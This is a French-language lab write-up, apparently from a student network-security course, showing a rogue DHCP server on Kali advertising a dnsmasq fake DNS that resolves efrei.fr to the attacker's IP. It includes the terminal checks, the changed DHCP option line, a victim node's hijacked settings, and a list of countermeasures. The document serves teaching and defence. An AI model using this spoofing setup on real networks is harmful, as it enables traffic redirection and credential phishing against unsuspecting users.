# 4. Attaque : DNS spoofing

**Objectif :** aller plus loin que le DHCP spoofing. Le rogue DHCP annonce aussi la machine attaquante comme **serveur DNS**, et ce faux DNS renvoie l'IP de l'attaquant pour `efrei.fr`. La victime croit joindre le vrai site, mais elle parle à l'attaquant.

## Vérification du faux serveur DNS sur Kali

**dnsmasq tourne en tâche de fond :**

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo ps -ef | grep dnsmasq
kali        4576       1  0 10:13 ?        00:00:00 dnsmasq -C /tmp/dnsmasq.conf -q
```

**Il écoute sur le port 53 (DNS) :**

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo ss -lptn 'sport = :53'
State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port   Process
LISTEN    0         32                 0.0.0.0:53              0.0.0.0:* users:(("dnsmasq",pid=4576,fd=5))
LISTEN    0         32                    [::]:53                 [::]:* users:(("dnsmasq",pid=4576,fd=7))
```

**Requête légitime : le vrai DNS renvoie la vraie IP d'efrei.fr :**

```
┌──(kali㉿kali)-[/tmp]
└─$ dig efrei.fr

;; ANSWER SECTION:
efrei.fr.               1435    IN      A       51.210.229.203
```

**Requête vers le faux DNS : il renvoie l'IP de l'attaquant :**

```
┌──(kali㉿kali)-[/tmp]
└─$ dig @127.0.0.1 efrei.fr

;; ANSWER SECTION:
efrei.fr.               0       IN      A       10.2.1.252

;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)
```

## Le rogue DHCP annonce maintenant le faux DNS

Ligne modifiée dans la configuration du rogue DHCP :

```
option domain-name-servers     10.2.1.252;
```

## Résultat côté victime

Nouveau client, node7 :

```
node7> ip dhcp
DDORA IP 10.2.1.202/24 GW 10.2.1.252

node7> show ip

NAME        : node7
IP/MASK     : 10.2.1.202/24
GATEWAY     : 10.2.1.252
DNS         : 10.2.1.252
DHCP SERVER : 10.2.1.252
DHCP LEASE  : 562, 600/300/525

node7> ping efrei.fr
efrei.fr resolved to 10.2.1.252
84 bytes from 10.2.1.252 icmp_seq=1 ttl=64 time=4.832 ms
84 bytes from 10.2.1.252 icmp_seq=2 ttl=64 time=8.769 ms
```

La victime a reçu **la passerelle, le DNS et le serveur DHCP de l'attaquant**. Quand elle tape `efrei.fr`, elle est envoyée sur `10.2.1.252`. Sur ce principe, un attaquant pourrait héberger une fausse page de connexion (phishing).

## Contre-mesures

- **DHCP Snooping** sur les switchs, pour bloquer les réponses DHCP venant de ports non autorisés.
- **Dynamic ARP Inspection**, pour empêcher l'usurpation d'adresses.
- **HTTPS et HSTS** côté sites web : le navigateur détecte que le certificat présenté par l'attaquant n'est pas valide.
